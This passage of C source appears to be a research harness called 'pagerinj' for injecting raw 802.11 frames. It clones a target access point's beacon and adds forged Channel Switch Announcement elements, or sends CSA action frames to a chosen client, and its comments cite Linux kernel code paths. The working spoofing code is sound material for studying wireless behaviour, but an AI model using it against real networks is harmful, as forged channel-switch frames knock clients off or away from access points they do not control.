    const uint8_t rt_bad[] = { 0x01,0x00, 0x08,0x00, 0x00,0x00,0x00,0x00 };
    st("rtap: rejects a non-zero version", rtap_parse(rt_bad, sizeof rt_bad, &fcs) == -1);
    const uint8_t rt_lie[] = { 0x00,0x00, 0xff,0x00, 0x00,0x00,0x00,0x00 };
    st("rtap: rejects it_len past the buffer", rtap_parse(rt_lie, sizeof rt_lie, &fcs) == -1);

    printf("== %d checks, %d failed ==\n", st_n, st_fail);
    return st_fail ? 1 : 0;
}

/* ----------------------------------------------------------------------- net */

static int open_mon(const char *ifname, int *ifindex)
{
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("socket(AF_PACKET)"); return -1; }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { perror("SIOCGIFINDEX"); close(fd); return -1; }
    *ifindex = ifr.ifr_ifindex;
    return fd;
}

static int tx(int fd, int ifindex, const uint8_t *f, size_t n)
{
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof sll);
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex  = ifindex;
    sll.sll_halen    = 6;
    return (int)sendto(fd, f, n, 0, (struct sockaddr *)&sll, sizeof sll);
}

/* Capture one beacon for `bssid`.  Returns the 802.11 frame with radiotap stripped and any
 * trailing FCS removed, which is what csa_frame_build() expects. */
static size_t capture_beacon(int fd, const uint8_t *bssid, int timeout_s,
                             uint8_t *out, size_t out_cap)
{
    uint8_t buf[4096];
    time_t deadline = time(NULL) + timeout_s;
    while (time(NULL) < deadline) {
        ssize_t n = recv(fd, buf, sizeof buf, MSG_DONTWAIT);
        if (n <= 0) { struct timespec ts = {0, 2000000}; nanosleep(&ts, NULL); continue; }
        const uint8_t *f = NULL;
        size_t flen = strip_capture(buf, (size_t)n, &f);
        if (!flen || flen < IE_START) continue;
        if (f[0] != FC_MGMT_BEACON_0 || (f[1] & 0x0c) != 0x00) continue;
        if (memcmp(f + 16, bssid, 6) != 0) continue;
        if (flen > out_cap) continue;
        memcpy(out, f, flen);
        return flen;
    }
    return 0;
}

static int parse_mac(const char *s, uint8_t *out)
{
    unsigned v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) { if (v[i] > 0xff) return -1; out[i] = (uint8_t)v[i]; }
    return 0;
}

static void usage(void)
{
    fprintf(stderr,
      "pagerinj — minimal 802.11 injector (never changes the channel)\n"
      "\n"
      "  pagerinj --selftest\n"
      "  pagerinj -i <iface> --nonce <text> [--chan N] [--rate N] [--secs N]\n"
      "  pagerinj -i <iface> --csa --bssid <mac> --chan N --count N\n"
      "                      [--ecsa-count N --ecsa-opclass N]\n"
      "                      [--mode N] [--rate N] [--secs N] [--wait N]\n"
      "  pagerinj -i <iface> --action --bssid <mac> --client <mac> --chan N --count N\n"
      "                      [--mode N] [--rate N] [--secs N]\n"
      "\n"
      "  --rate         frames per second (default 10)\n"
      "  --secs         how long to transmit; 0 = until interrupted (default 10)\n"
      "  --count        CSA Channel Switch Count.  pineapd hardcodes 0, which the kernel\n"
      "                 discards before the auth/assoc refusal check.  17a is 0 vs 3.\n"
      "  --mode         CSA Channel Switch Mode (default 1, matching pineapd)\n"
      "  --wait         seconds to wait for a beacon from --bssid (default 10)\n"
      "  --ecsa-count   also append an Extended CSA (element 60) with this count.  17a's\n"
      "                 third arm: leaves pineapd's element byte-identical, and\n"
      "                 csa_present() discards per element, so {37 count=0}+{60 count!=0}\n"
      "                 still returns true.  Requires --ecsa-opclass.\n"
      "  --ecsa-opclass new operating class for the eCSA.  No default on purpose — read it\n"
      "                 off the target's Supported Operating Classes element, not from memory.\n"
      "  --client       A1 for --action.  A3 is set to --bssid; a wrong A3 is dropped\n"
      "                 silently (rx612.c:3738), so both are required.\n"
      "\n"
      "Set the channel yourself first:  iw dev <iface> set freq <MHz> 20\n"
      "Run the 2.4 GHz control first:   same frame on ch 6, confirmed at the receiver.  If it\n"
      "lands there, radiotap and the driver are ruled out and silence on ch 52 is the gate.\n");
}

int main(int argc, char **argv)
{
    const char *ifname = NULL, *nonce = NULL;
    int do_csa = 0, do_nonce = 0, do_action = 0, chan = 0, count = -1, mode = 1;
    int rate = 10, secs = 10, wait_s = 10;
    int ecsa_count = -1, ecsa_opclass = -1;
    uint8_t bssid[6]; int have_bssid = 0;
    uint8_t client[6]; int have_client = 0;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        #define NEXT() (++i < argc ? argv[i] : (usage(), exit(2), ""))
        if      (!strcmp(a, "--selftest")) return selftest();
        else if (!strcmp(a, "-i"))         ifname = NEXT();
        else if (!strcmp(a, "--nonce"))  { do_nonce = 1; nonce = NEXT(); }
        else if (!strcmp(a, "--csa"))      do_csa = 1;
        else if (!strcmp(a, "--action"))   do_action = 1;
        else if (!strcmp(a, "--bssid"))  { if (parse_mac(NEXT(), bssid) < 0) { usage(); return 2; } have_bssid = 1; }
        else if (!strcmp(a, "--client")) { if (parse_mac(NEXT(), client) < 0) { usage(); return 2; } have_client = 1; }
        else if (!strcmp(a, "--chan"))     chan  = atoi(NEXT());
        else if (!strcmp(a, "--count"))    count = atoi(NEXT());
        else if (!strcmp(a, "--mode"))     mode  = atoi(NEXT());
        else if (!strcmp(a, "--rate"))     rate  = atoi(NEXT());
        else if (!strcmp(a, "--secs"))     secs  = atoi(NEXT());
        else if (!strcmp(a, "--wait"))     wait_s = atoi(NEXT());
        else if (!strcmp(a, "--ecsa-count"))   ecsa_count   = atoi(NEXT());
        else if (!strcmp(a, "--ecsa-opclass")) ecsa_opclass = atoi(NEXT());
        else { usage(); return 2; }
        #undef NEXT
    }

    if (do_csa + do_nonce + do_action != 1) { usage(); return 2; }
    if (!ifname)                            { usage(); return 2; }
    if (rate < 1) rate = 1;
    if (mode < 0 || mode > 255) { usage(); return 2; }
    if (ecsa_count >= 0) {
        /* Not defaulted, and the reason is narrower than this comment first claimed.  Both halves
         * below re-read at upstream v6.12 rather than inherited: csa_present() (mlme.c:8328) takes
         * only datalen, count, mode and new_ch_num and never touches the operating class, so the
         * DENIAL arm fires whatever this byte says; and on the move path a bad class does not abort
         * either -- spectmgmt.c:259 zeroes new_op_class and :272 falls back to element 37.  [V]
         *
         * One sharper consequence of that fallback, which matters to the third arm specifically.
         * The fallback does not merely lose the class, it takes element 37's **count**:
         *
         *     if (!new_op_class && elems->ch_switch_ie) {
         *             new_chan_no   = elems->ch_switch_ie->new_ch_num;
         *             csa_ie->count = elems->ch_switch_ie->count;      <-- 0, in the third arm
         *
         * so with --count 0 --ecsa-count 3 the operating class decides *which element's count the
         * move path uses*: good class -> the eCSA's 3 (delayed switch, element 37 never read);
         * bad class -> element 37's 0 (immediate switch).  The denial arm is unaffected either way.
         * That is the real reason to read the value off the target instead of guessing -- a guess
         * that happens to parse silently changes what the move arm measures. */
        if (!do_csa || ecsa_count > 255 || ecsa_opclass < 0 || ecsa_opclass > 255) {
            fprintf(stderr, "--ecsa-count needs --csa and an explicit --ecsa-opclass\n");
            usage(); return 2;
        }
    }
    if (do_csa || do_action) {
        if (!have_bssid || chan <= 0 || chan > 255 || count < 0 || count > 255) { usage(); return 2; }
    }
    if (do_action && !have_client) {
        fprintf(stderr, "--action needs --client (A1) as well as --bssid (A2/A3)\n");
        usage(); return 2;
    }
    if (do_nonce && (chan <= 0 || chan > 255))
        chan = 1;   /* only cosmetic for the nonce beacon's DS element */

    /* csa_present() carries a SECOND per-element discard that is easy to walk into, and that
     * neither this file nor the docs mentioned until it was read at v6.12 (mlme.c:8350, and the
     * same pair for the eCSA):
     *
     *     if (csa && !csa->mode && csa->new_ch_num == cur_channel)   csa = NULL;
     *
     * So mode 0 announcing the channel the target is already on is discarded -- silently, and
     * before the count is ever considered.  pineapd hardcodes mode 1 and so do we by default, but
     * --mode 0 is reachable from the command line and the tool cannot check the second half of the
     * condition because it deliberately never reads the current channel. */
    if ((do_csa || do_action) && mode == 0)
        fprintf(stderr, "warning: --mode 0 is discarded outright by csa_present() if --chan %d is "
                        "the channel the target is already on (mlme.c:8350). pineapd uses mode 1.\n",
                chan);

    int ifindex = 0;
    int fd = open_mon(ifname, &ifindex);
    if (fd < 0) return 1;

    uint8_t frame[4096];
    size_t flen = 0;

    if (do_nonce) {
        flen = nonce_frame_build(nonce, (uint8_t)chan, frame, sizeof frame);
        if (!flen) { fprintf(stderr, "nonce too long\n"); close(fd); return 1; }
        fprintf(stderr, "nonce beacon: ssid=\"%s\" src=%02x:%02x:%02x:%02x:%02x:%02x %zu bytes\n",
                nonce, frame[RTAP_TX_LEN+10], frame[RTAP_TX_LEN+11], frame[RTAP_TX_LEN+12],
                frame[RTAP_TX_LEN+13], frame[RTAP_TX_LEN+14], frame[RTAP_TX_LEN+15], flen);
    } else if (do_action) {
        flen = action_frame_build(client, bssid, (uint8_t)mode, (uint8_t)chan, (uint8_t)count,
                                  frame, sizeof frame);
        if (!flen) { fprintf(stderr, "could not build the action frame\n"); close(fd); return 1; }
        fprintf(stderr, "unicast action frame: cat 0 / action 4, A1=%02x:%02x:%02x:%02x:%02x:%02x "
                        "A3=%02x:%02x:%02x:%02x:%02x:%02x, CSA {37,3,mode=%d,ch=%d,count=%d}; "
                        "%zu bytes\n",
                client[0],client[1],client[2],client[3],client[4],client[5],
                bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
                mode, chan, count, flen);
        fprintf(stderr, "note: the client must be associated, and A3 must match its BSSID or the "
                        "frame is dropped with no log\n");
    } else {
        uint8_t cap[4096];
        fprintf(stderr, "waiting up to %ds for a beacon from %02x:%02x:%02x:%02x:%02x:%02x ...\n",
                wait_s, bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
        size_t clen = capture_beacon(fd, bssid, wait_s, cap, sizeof cap);
        if (!clen) {
            fprintf(stderr, "no beacon captured — is the interface on the target's channel?\n");
            close(fd); return 1;
        }
        flen = csa_frame_build(cap, clen, (uint8_t)mode, (uint8_t)chan, (uint8_t)count,
                               ecsa_count, (uint8_t)(ecsa_opclass < 0 ? 0 : ecsa_opclass),
                               frame, sizeof frame);
        if (!flen) { fprintf(stderr, "could not build the CSA frame\n"); close(fd); return 1; }
        if (ecsa_count >= 0)
            fprintf(stderr, "cloned %zu-byte beacon; CSA {37,3,mode=%d,ch=%d,count=%d} + "
                            "eCSA {60,4,mode=%d,opclass=%d,ch=%d,count=%d}; %zu bytes\n",
                    clen, mode, chan, count, mode, ecsa_opclass, chan, ecsa_count, flen);
        else
            fprintf(stderr, "cloned %zu-byte beacon; CSA {37,3,mode=%d,ch=%d,count=%d}; %zu bytes\n",
                    clen, mode, chan, count, flen);
    }

    /* Transmit.  Nothing here touches the channel — see the file header. */
    long sent = 0, failed = 0;
    time_t end = secs > 0 ? time(NULL) + secs : 0;
    long interval_ns = 1000000000L / rate;
    for (;;) {
        if (end && time(NULL) >= end) break;
        if (tx(fd, ifindex, frame, flen) < 0) {
            if (failed == 0) perror("sendto");
            failed++;
        } else {
            sent++;
        }
        struct timespec ts = { interval_ns / 1000000000L, interval_ns % 1000000000L };
        nanosleep(&ts, NULL);
    }

    /* sendto() reporting success proves nothing: a cfg80211-blocked frame is freed and the path
     * returns NETDEV_TX_OK.  Only the external receiver can tell you it was transmitted. */
    fprintf(stderr, "sent=%ld failed=%ld  (sendto success does NOT mean transmitted — "
                    "confirm at the external receiver)\n", sent, failed);
    close(fd);
    return failed && !sent ? 1 : 0;
}
